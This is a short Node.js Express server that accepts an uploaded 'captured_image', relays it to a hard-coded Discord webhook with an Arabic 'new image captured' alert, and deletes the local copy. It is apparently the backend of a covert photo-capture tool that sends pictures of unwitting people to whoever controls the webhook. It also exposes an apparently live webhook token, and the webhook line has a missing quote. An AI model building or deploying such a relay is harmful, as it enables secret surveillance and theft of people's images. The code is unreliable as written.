const express = require('express');
const multer = require('multer');
const path = require('path');
const cors = require('cors');
const fs = require('fs');
const axios = require('axios');

const app = express();
app.use(cors());

const PORT = process.env.PORT || 3000;
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, uploadDir),
    filename: (req, file, cb) => {
        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
        cb(null, 'snap-' + uniqueSuffix + path.extname(file.originalname));
    }
});

const upload = multer({ storage: storage });

const DISCORD_WEBHOOK_URL = https://discord.com/api/webhooks/1525474576606429217/oWCYqOBzZ1srvTFOwFDoz4TEMNLNT0THY9X4jmVm1zCFELE90qOkxGST6-QQ1iN6DcHR';

app.post('/api/upload', upload.single('captured_image'), async (req, res) => {
    if (!req.file) return res.status(400).json({ error: 'لا يوجد ملف' });

    try {
        const formdata = require('form-data');
        const discordData = new formdata();
        discordData.append('file', fs.createReadStream(req.file.path));
        discordData.append('content', '🚨 **تم التقاط صورة جديدة!**');

        await axios.post(DISCORD_WEBHOOK_URL, discordData, { 
            headers: discordData.getHeaders() 
        });
        
        fs.unlinkSync(req.file.path); 
        return res.status(200).json({ message: 'تم الإرسال بنجاح' });
    } catch (error) {
        console.error(error);
        if (req.file && fs.existsSync(req.file.path)) {
            fs.unlinkSync(req.file.path);
        }
        return res.status(500).json({ error: 'فشل الإرسال' });
    }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
